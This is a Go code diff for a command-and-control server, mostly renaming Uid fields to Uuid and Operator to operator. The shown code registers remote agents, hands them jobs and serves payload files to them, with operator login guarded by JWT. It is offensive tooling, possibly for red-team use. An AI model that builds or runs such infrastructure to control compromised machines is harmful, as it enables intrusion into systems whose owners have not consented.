@@ -26,13 +26,13 @@ type C2Server struct {
 }
 
 type connectAgent struct {
-	Uid      string `form:"uid" json:"uid" binding:"required"`
+	Uuid     string `form:"uuid" json:"uuid" binding:"required"`
 	Hostname string `form:"hostname" json:"hostname" binding:"required"`
 	Ip       string `form:"ip" json:"ip" binding:"required"`
 }
 
 type Agent struct {
-	Uid      string
+	Uuid     string
 	Hostname string
 	Ip       string
 }
@@ -41,7 +41,7 @@ type login struct {
 	Password string `form:"password" json:"password" binding:"required"`
 }
 
-type Operator struct {
+type operator struct {
 	Username string
 }
 
@@ -99,7 +99,7 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 	agent.Use(authAgentMiddleware.MiddlewareFunc())
 	{
 		agent.GET("/jobs", c2s.jobsHandler)
-		agent.GET("/payload/:jobuid", c2s.payloadHandler)
+		agent.GET("/payload/:job-uuid", c2s.payloadHandler)
 	}
 
 	authOperatorMiddleware, err := c2s.initOperatorJWTMiddleware()
@@ -120,7 +120,7 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 }
 
 func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
-	c2s.agentIdentityKey = "Uid"
+	c2s.agentIdentityKey = "Uuid"
 	secret := util.RandString(256)
 	authMiddleware, err := jwt.New(&jwt.GinJWTMiddleware{
 		Realm:       "C2-agent",
@@ -131,7 +131,7 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 		PayloadFunc: func(data interface{}) jwt.MapClaims {
 			if v, ok := data.(*Agent); ok {
 				return jwt.MapClaims{
-					c2s.agentIdentityKey: v.Uid,
+					c2s.agentIdentityKey: v.Uuid,
 				}
 			}
 			return jwt.MapClaims{}
@@ -139,7 +139,7 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 		IdentityHandler: func(c *gin.Context) interface{} {
 			claims := jwt.ExtractClaims(c)
 			for _, agent := range c2s.activeAgents {
-				if agent.Uid == claims[c2s.agentIdentityKey].(string) {
+				if agent.Uuid == claims[c2s.agentIdentityKey].(string) {
 					return &agent
 				}
 			}
@@ -150,13 +150,13 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 			if err := c.ShouldBind(&connectAgentVars); err != nil {
 				return "", jwt.ErrMissingLoginValues
 			}
-			uid := connectAgentVars.Uid
+			uuid := connectAgentVars.Uuid
 			hostname := connectAgentVars.Hostname
 			ip := connectAgentVars.Ip
 
-			if len(uid) == 16 && len(hostname) < 16 && net.ParseIP(ip) != nil {
+			if len(uuid) == 16 && len(hostname) < 16 && net.ParseIP(ip) != nil {
 				newAgent := Agent{
-					Uid:      uid,
+					Uuid:     uuid,
 					Hostname: hostname,
 					Ip:       ip,
 				}
@@ -170,7 +170,7 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 			v, ok := data.(*Agent)
 			if ok {
 				for _, agent := range c2s.activeAgents {
-					if v.Uid == agent.Uid {
+					if v.Uuid == agent.Uuid {
 						return true
 					}
 				}
@@ -197,12 +197,12 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 
 func (c2s *C2Server) jobsHandler(c *gin.Context) {
 	agent, _ := c.Get(c2s.agentIdentityKey)
-	c.JSON(200, c2s.jobs[agent.(*Agent).Uid])
+	c.JSON(200, c2s.jobs[agent.(*Agent).Uuid])
 }
 
 func (c2s *C2Server) payloadHandler(c *gin.Context) {
-	jobUid := c.Param("jobuid")
-	payloadFilename := c2s.payloads[jobUid]
+	jobUuid := c.Param("job-uuid")
+	payloadFilename := c2s.payloads[jobUuid]
 	payloadPath := filepath.Join("data/c2/payloads/", payloadFilename)
 	c.Header("Content-Description", "File Transfer")
 	c.Header("Content-Transfer-Encoding", "binary")
@@ -221,7 +221,7 @@ func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) 
 		MaxRefresh:  time.Hour,
 		IdentityKey: c2s.operatorIdentityKey,
 		PayloadFunc: func(data interface{}) jwt.MapClaims {
-			if v, ok := data.(*Operator); ok {
+			if v, ok := data.(*operator); ok {
 				return jwt.MapClaims{
 					c2s.operatorIdentityKey: v.Username,
 				}
@@ -230,7 +230,7 @@ func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) 
 		},
 		IdentityHandler: func(c *gin.Context) interface{} {
 			claims := jwt.ExtractClaims(c)
-			return &Operator{
+			return &operator{
 				Username: claims[c2s.operatorIdentityKey].(string),
 			}
 		},
@@ -243,7 +243,7 @@ func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) 
 			password := loginVals.Password
 
 			if userID == "c2operator" && util.CheckPasswordHash(password, c2s.operatorPasswordHash) {
-				return &Operator{
+				return &operator{
 					Username: userID,
 				}, nil
 			}
@@ -251,7 +251,7 @@ func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) 
 			return nil, jwt.ErrFailedAuthentication
 		},
 		Authorizator: func(data interface{}, c *gin.Context) bool {
-			if v, ok := data.(*Operator); ok && v.Username == "c2operator" {
+			if v, ok := data.(*operator); ok && v.Username == "c2operator" {
 				return true
 			}
 
@@ -266,7 +266,6 @@ func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) 
 		TokenLookup:   "header: Authorization, query: token, cookie: jwt",
 		TokenHeadName: "Bearer",
 
-		// TimeFunc provides the current time. You can override it to use another time value. This is useful for testing or if your server uses a different time zone than your tokens.
 		TimeFunc: time.Now,
 	})
 	if err != nil {
@@ -281,14 +280,14 @@ func (c2s *C2Server) agentsHandler(c *gin.Context) {
 
 func (c2s *C2Server) addJobHandler(c *gin.Context) {
 	var addJobRequest struct {
-		AgentUid string `json:"agent-uid" binding:"required"`
-		JobUid   string `json:"job-uid" binding:"required"`
+		AgentUuid string `json:"agent-uuid" binding:"required"`
+		JobUuid   string `json:"job-uuid" binding:"required"`
 	}
 	if c.Bind(&addJobRequest) == nil {
-		if len(c2s.jobs[addJobRequest.AgentUid]) == 0 {
-			c2s.jobs[addJobRequest.AgentUid] = []string{addJobRequest.JobUid}
+		if len(c2s.jobs[addJobRequest.AgentUuid]) == 0 {
+			c2s.jobs[addJobRequest.AgentUuid] = []string{addJobRequest.JobUuid}
 		} else {
-			c2s.jobs[addJobRequest.AgentUid] = append(c2s.jobs[addJobRequest.AgentUid], addJobRequest.JobUid)
+			c2s.jobs[addJobRequest.AgentUuid] = append(c2s.jobs[addJobRequest.AgentUuid], addJobRequest.JobUuid)
 		}
 	}
 	c.JSON(200, gin.H{"status": "ok"})
